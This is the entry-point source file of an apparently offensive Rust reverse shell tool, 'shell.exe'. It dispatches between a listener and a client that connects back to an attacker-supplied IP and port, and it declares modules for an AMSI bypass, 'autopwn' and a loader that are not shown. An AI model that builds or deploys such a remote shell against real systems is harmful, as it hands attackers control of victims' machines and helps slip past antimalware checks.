mod utils {
    pub mod structures;
    pub mod tools;
}
mod amsi_bypass;
mod autopwn;
#[cfg_attr(target_family = "unix", path = "client_linux.rs")]
#[cfg_attr(target_family = "windows", path = "client_windows.rs")]
mod client;
mod loader;
mod server;

use crate::client::client;
use crate::server::server;
use log::LevelFilter;
use simple_logger::SimpleLogger;
use std::error::Error;
use std::env;

fn main() -> Result<(), Box<dyn Error>> {
    SimpleLogger::new()
        .without_timestamps()
        .with_colors(true)
        .init()
        .unwrap();
    ::log::set_max_level(LevelFilter::Info);

    let args: Vec<String> = env::args().collect();
    if args.len() < 4 {
        log::warn!("{}", help());
        std::process::exit(1);
    }

    if args[1] == "l" {
        match server(&args[2], args[3].parse::<u16>().unwrap()) {
            Ok(_) => (),
            Err(r) => {
                log::error!("Error starting the server : {}", r);
                return Err(r);
            }
        }
    } else if args[1] == "c" {
        match client(&args[2], &args[3]) {
            Ok(_) => (),
            Err(r) => {
                log::debug!(
                    "Error during client execution : {}. Attempt to restart it",
                    r
                );
                match client(&args[2], &args[3]) {
                    Ok(_) => (),
                    Err(r) => {
                        log::debug!("Error still present : {}", r);
                        return Err(r);
                    }
                }
            }
        }
    }

    Ok(())
}

fn help() -> String {
    return "options missing
    Usage : shell.exe [l | c] IP port

    l       launch the listener application
    c       launch the client application

    IP      IP address to bind to for the listener, or to connect to for the client
    port    port address to bind to for the listener, or to connect to for the client

    In a session, type 'help' for advanced integrated commands
    "
    .to_string();
}
